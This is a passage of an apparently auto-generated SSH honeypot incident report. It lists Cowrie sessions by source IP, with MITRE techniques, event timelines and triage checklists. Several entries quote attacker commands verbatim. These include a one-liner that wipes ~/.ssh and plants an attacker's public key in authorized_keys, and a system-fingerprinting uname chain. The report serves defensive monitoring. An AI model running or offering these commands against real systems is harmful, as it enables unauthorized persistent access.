| `2026-07-06 11:28:44` | `cowrie.command.input` |
| `2026-07-06 11:28:44` | `cowrie.command.failed` |
| `2026-07-06 11:28:45` | `cowrie.log.closed` |
| `2026-07-06 11:28:46` | `cowrie.session.params` |
| `2026-07-06 11:28:46` | `cowrie.command.input` |
| `2026-07-06 11:28:47` | `cowrie.session.file_download` |
| `2026-07-06 11:28:47` | `cowrie.log.closed` |
| `2026-07-06 11:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.173.65[.]4` to AbuseIPDB if not already reported
- [ ] Block `117.173.65[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede1934e6d15

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 11:31 |
| **Last Seen** | 2026-07-06 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:31:26` | `cowrie.session.connect` |
| `2026-07-06 11:31:26` | `cowrie.client.version` |
| `2026-07-06 11:31:26` | `cowrie.client.kex` |
| `2026-07-06 11:31:26` | `cowrie.login.success` |
| `2026-07-06 11:31:27` | `cowrie.session.params` |
| `2026-07-06 11:31:27` | `cowrie.command.input` |
| `2026-07-06 11:31:27` | `cowrie.log.closed` |
| `2026-07-06 11:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f9213560e5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 11:32 |
| **Last Seen** | 2026-07-06 11:32 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:32:19` | `cowrie.session.connect` |
| `2026-07-06 11:32:22` | `cowrie.client.version` |
| `2026-07-06 11:32:22` | `cowrie.client.kex` |
| `2026-07-06 11:32:28` | `cowrie.login.success` |
| `2026-07-06 11:32:33` | `cowrie.session.params` |
| `2026-07-06 11:32:33` | `cowrie.command.input` |
| `2026-07-06 11:32:34` | `cowrie.log.closed` |
| `2026-07-06 11:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8f8efdf123

| Field | Detail |
|---|---|
| **Source IP** | `190.221.50[.]123` |
| **First Seen** | 2026-07-06 11:33 |
| **Last Seen** | 2026-07-06 11:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:33:36` | `cowrie.session.connect` |
| `2026-07-06 11:33:36` | `cowrie.client.version` |
| `2026-07-06 11:33:36` | `cowrie.client.kex` |
| `2026-07-06 11:33:37` | `cowrie.login.success` |
| `2026-07-06 11:33:38` | `cowrie.session.params` |
| `2026-07-06 11:33:38` | `cowrie.command.input` |
| `2026-07-06 11:33:38` | `cowrie.command.failed` |
| `2026-07-06 11:33:38` | `cowrie.log.closed` |
| `2026-07-06 11:33:39` | `cowrie.session.params` |
| `2026-07-06 11:33:39` | `cowrie.command.input` |
| `2026-07-06 11:33:39` | `cowrie.session.file_download` |
| `2026-07-06 11:33:39` | `cowrie.log.closed` |
| `2026-07-06 11:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.221.50[.]123` to AbuseIPDB if not already reported
- [ ] Block `190.221.50[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19832699771

| Field | Detail |
|---|---|
| **Source IP** | `190.221.50[.]123` |
| **First Seen** | 2026-07-06 11:33 |
| **Last Seen** | 2026-07-06 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:33:40` | `cowrie.session.connect` |
| `2026-07-06 11:33:40` | `cowrie.client.version` |
| `2026-07-06 11:33:40` | `cowrie.client.kex` |
| `2026-07-06 11:33:41` | `cowrie.login.success` |
| `2026-07-06 11:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.221.50[.]123` to AbuseIPDB if not already reported
- [ ] Block `190.221.50[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e40af1f073

| Field | Detail |
|---|---|
| **Source IP** | `190.221.50[.]123` |
| **First Seen** | 2026-07-06 11:33 |
| **Last Seen** | 2026-07-06 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:33:41` | `cowrie.session.connect` |
| `2026-07-06 11:33:41` | `cowrie.client.version` |
| `2026-07-06 11:33:41` | `cowrie.client.kex` |
| `2026-07-06 11:33:42` | `cowrie.login.success` |
| `2026-07-06 11:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.221.50[.]123` to AbuseIPDB if not already reported
- [ ] Block `190.221.50[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3b5d7d8cb7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:35 |
| **Last Seen** | 2026-07-06 11:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:35:10` | `cowrie.session.connect` |
| `2026-07-06 11:35:10` | `cowrie.client.version` |
| `2026-07-06 11:35:10` | `cowrie.client.kex` |
| `2026-07-06 11:35:14` | `cowrie.login.success` |
| `2026-07-06 11:35:16` | `cowrie.session.params` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.success` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:16` | `cowrie.command.input` |
| `2026-07-06 11:35:17` | `cowrie.log.closed` |
| `2026-07-06 11:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542433b06b39

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-07-06 11:36 |
| **Last Seen** | 2026-07-06 11:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:36:35` | `cowrie.session.connect` |
| `2026-07-06 11:36:35` | `cowrie.client.version` |
| `2026-07-06 11:36:36` | `cowrie.client.kex` |
| `2026-07-06 11:36:36` | `cowrie.login.success` |
| `2026-07-06 11:36:37` | `cowrie.session.params` |
| `2026-07-06 11:36:37` | `cowrie.command.input` |
| `2026-07-06 11:36:37` | `cowrie.command.failed` |
| `2026-07-06 11:36:37` | `cowrie.log.closed` |
| `2026-07-06 11:36:38` | `cowrie.session.params` |
| `2026-07-06 11:36:38` | `cowrie.command.input` |
| `2026-07-06 11:36:38` | `cowrie.session.file_download` |
| `2026-07-06 11:36:38` | `cowrie.log.closed` |
| `2026-07-06 11:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534e61e3e9b8

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-07-06 11:36 |
| **Last Seen** | 2026-07-06 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:36:38` | `cowrie.session.connect` |
| `2026-07-06 11:36:38` | `cowrie.client.version` |
| `2026-07-06 11:36:38` | `cowrie.client.kex` |
| `2026-07-06 11:36:38` | `cowrie.login.success` |
| `2026-07-06 11:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90dc41b17a27

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-07-06 11:36 |
| **Last Seen** | 2026-07-06 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:36:38` | `cowrie.session.connect` |
| `2026-07-06 11:36:38` | `cowrie.client.version` |
| `2026-07-06 11:36:38` | `cowrie.client.kex` |
| `2026-07-06 11:36:39` | `cowrie.login.success` |
| `2026-07-06 11:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991d422350d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:37 |
| **Last Seen** | 2026-07-06 11:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:37:38` | `cowrie.session.connect` |
| `2026-07-06 11:37:39` | `cowrie.client.version` |
| `2026-07-06 11:37:39` | `cowrie.client.kex` |
| `2026-07-06 11:37:43` | `cowrie.login.success` |
| `2026-07-06 11:37:46` | `cowrie.session.params` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.success` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.command.input` |
| `2026-07-06 11:37:46` | `cowrie.log.closed` |
| `2026-07-06 11:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57382354b3cf

| Field | Detail |
|---|---|
| **Source IP** | `213.21.248[.]43` |
| **First Seen** | 2026-07-06 11:38 |
| **Last Seen** | 2026-07-06 11:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:38:49` | `cowrie.session.connect` |
| `2026-07-06 11:38:49` | `cowrie.client.version` |
| `2026-07-06 11:38:50` | `cowrie.client.kex` |
| `2026-07-06 11:38:50` | `cowrie.login.success` |
| `2026-07-06 11:38:51` | `cowrie.session.params` |
| `2026-07-06 11:38:51` | `cowrie.command.input` |
| `2026-07-06 11:38:51` | `cowrie.command.failed` |
| `2026-07-06 11:38:51` | `cowrie.log.closed` |
| `2026-07-06 11:38:52` | `cowrie.session.params` |
| `2026-07-06 11:38:52` | `cowrie.command.input` |
| `2026-07-06 11:38:52` | `cowrie.session.file_download` |
| `2026-07-06 11:38:52` | `cowrie.log.closed` |
| `2026-07-06 11:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.21.248[.]43` to AbuseIPDB if not already reported
- [ ] Block `213.21.248[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f914217d8969

| Field | Detail |
|---|---|
| **Source IP** | `213.21.248[.]43` |
| **First Seen** | 2026-07-06 11:38 |
| **Last Seen** | 2026-07-06 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:38:52` | `cowrie.session.connect` |
| `2026-07-06 11:38:52` | `cowrie.client.version` |
| `2026-07-06 11:38:52` | `cowrie.client.kex` |
| `2026-07-06 11:38:52` | `cowrie.login.success` |
| `2026-07-06 11:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.21.248[.]43` to AbuseIPDB if not already reported
- [ ] Block `213.21.248[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a26312d12c5b

| Field | Detail |
|---|---|
| **Source IP** | `213.21.248[.]43` |
| **First Seen** | 2026-07-06 11:38 |
| **Last Seen** | 2026-07-06 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:38:52` | `cowrie.session.connect` |
| `2026-07-06 11:38:52` | `cowrie.client.version` |
| `2026-07-06 11:38:52` | `cowrie.client.kex` |
| `2026-07-06 11:38:53` | `cowrie.login.success` |
| `2026-07-06 11:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.21.248[.]43` to AbuseIPDB if not already reported
- [ ] Block `213.21.248[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47b3b09cc32

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:40 |
| **Last Seen** | 2026-07-06 11:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:40:19` | `cowrie.session.connect` |
| `2026-07-06 11:40:19` | `cowrie.client.version` |
| `2026-07-06 11:40:19` | `cowrie.client.kex` |
| `2026-07-06 11:40:25` | `cowrie.login.success` |
| `2026-07-06 11:40:28` | `cowrie.session.params` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.success` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.command.input` |
| `2026-07-06 11:40:28` | `cowrie.log.closed` |
| `2026-07-06 11:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7bdd7cf52a

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-06 11:41 |
| **Last Seen** | 2026-07-06 11:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:41:23` | `cowrie.session.connect` |
| `2026-07-06 11:41:23` | `cowrie.client.version` |
| `2026-07-06 11:41:23` | `cowrie.client.kex` |
| `2026-07-06 11:41:23` | `cowrie.login.success` |
| `2026-07-06 11:41:24` | `cowrie.session.params` |
| `2026-07-06 11:41:24` | `cowrie.command.input` |
| `2026-07-06 11:41:24` | `cowrie.command.failed` |
| `2026-07-06 11:41:24` | `cowrie.log.closed` |
| `2026-07-06 11:41:25` | `cowrie.session.params` |
| `2026-07-06 11:41:25` | `cowrie.command.input` |
| `2026-07-06 11:41:25` | `cowrie.session.file_download` |
| `2026-07-06 11:41:25` | `cowrie.log.closed` |
| `2026-07-06 11:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427456db0487

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-06 11:41 |
| **Last Seen** | 2026-07-06 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:41:25` | `cowrie.session.connect` |
| `2026-07-06 11:41:25` | `cowrie.client.version` |
| `2026-07-06 11:41:25` | `cowrie.client.kex` |
| `2026-07-06 11:41:26` | `cowrie.login.success` |
| `2026-07-06 11:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ca7d5f29f8

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-06 11:41 |
| **Last Seen** | 2026-07-06 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:41:26` | `cowrie.session.connect` |
| `2026-07-06 11:41:26` | `cowrie.client.version` |
| `2026-07-06 11:41:26` | `cowrie.client.kex` |
| `2026-07-06 11:41:26` | `cowrie.login.success` |
| `2026-07-06 11:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac8aee51597

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:42 |
| **Last Seen** | 2026-07-06 11:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:42:47` | `cowrie.session.connect` |
| `2026-07-06 11:42:48` | `cowrie.client.version` |
| `2026-07-06 11:42:48` | `cowrie.client.kex` |
| `2026-07-06 11:42:53` | `cowrie.login.success` |
| `2026-07-06 11:42:56` | `cowrie.session.params` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
